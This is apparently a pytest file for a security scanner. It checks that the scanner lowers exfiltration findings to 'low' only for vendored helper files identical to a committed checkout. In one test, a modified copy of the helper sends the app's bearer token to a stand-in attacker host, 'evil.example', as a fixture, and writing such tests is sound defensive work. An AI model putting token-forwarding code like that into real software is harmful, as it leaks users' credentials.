"""The Hoard Link family helpers vendored by every Hoard app read the app's own
token and call the local hub: identical copies of what the user's Hoard Link
checkout has committed are lowered to "low"; anything else keeps its severity."""

import os
import shutil
import subprocess

import pytest

from src import security_scan

pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="needs git")

FAMILY = (
    '"""Family helpers: talk to the local hub with this app\'s own token."""\n'
    "import json\n\n"
    "def _token():\n"
    "    return open(TOKEN_FILE).read().strip()\n\n"
    "def _post(path, body):\n"
    "    tok = _token()\n"
    "    return fetch(_hub() + path, body, headers={'Authorization': 'Bearer ' + tok})\n"
    "# padding so the file is not trivially small ......................................\n"
)


def _git(cwd, *args):
    subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid", *args],
                   cwd=cwd, check=True, capture_output=True)


def _write(path, text, newline="\n"):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8", newline=newline) as fh:
        fh.write(text)


@pytest.fixture()
def family(tmp_path, monkeypatch):
    monkeypatch.delenv("HOARD_LINK_DIR", raising=False)
    hub = tmp_path / "HoardLink"
    _write(str(hub / "hoard_link" / "hub" / "__main__.py"), "print('hub')\n")
    _write(str(hub / "hoard_link" / "family.py"), FAMILY)
    _git(str(hub), "init", "-q")
    _git(str(hub), "add", "-A")
    _git(str(hub), "commit", "-q", "-m", "family")
    return tmp_path


def _exfil(result):
    return [f for f in result.findings if f.rule_id == "EXFIL_SECRET_TO_NETWORK"]


def test_vendored_identical_copy_is_lowered_even_with_crlf(family):
    app = family / "HomeApp"
    _write(str(app / "bridge" / "hoard_link" / "family.py"), FAMILY, newline="\r\n")
    found = _exfil(security_scan.scan_paths(str(app)))
    assert found and all(f.severity == "low" for f in found)
    assert "Hoard Link family library" in found[0].description


def test_modified_copy_keeps_its_severity(family):
    app = family / "OtherApp"
    _write(str(app / "hoard_link" / "family.py"), FAMILY.replace("_hub() + path", "'http://evil.example' + path"))
    found = _exfil(security_scan.scan_paths(str(app)))
    assert found and found[0].severity == "critical"


def test_uncommitted_content_is_not_trusted(family):
    hub = family / "HoardLink"
    changed = FAMILY + "# a local edit nobody committed\n"
    _write(str(hub / "hoard_link" / "family.py"), changed)
    app = family / "ThirdApp"
    _write(str(app / "hoard_link" / "family.py"), changed)
    found = _exfil(security_scan.scan_paths(str(app)))
    assert found and found[0].severity == "critical"


def test_the_checkout_itself_is_reviewed_as_itself(family):
    found = _exfil(security_scan.scan_paths(str(family / "HoardLink")))
    assert found and found[0].severity == "critical"


def test_without_a_checkout_nothing_changes(tmp_path, monkeypatch):
    monkeypatch.delenv("HOARD_LINK_DIR", raising=False)
    app = tmp_path / "Lonely"
    _write(str(app / "hoard_link" / "family.py"), FAMILY)
    found = _exfil(security_scan.scan_paths(str(app)))
    assert found and found[0].severity == "critical"


def test_hoard_link_dir_env_points_at_a_checkout_elsewhere(family, tmp_path_factory, monkeypatch):
    elsewhere = tmp_path_factory.mktemp("apps") / "deep" / "App"
    _write(str(elsewhere / "hoard_link" / "family.py"), FAMILY)
    assert _exfil(security_scan.scan_paths(str(elsewhere)))[0].severity == "critical"
    monkeypatch.setenv("HOARD_LINK_DIR", str(family / "HoardLink"))
    assert _exfil(security_scan.scan_paths(str(elsewhere)))[0].severity == "low"
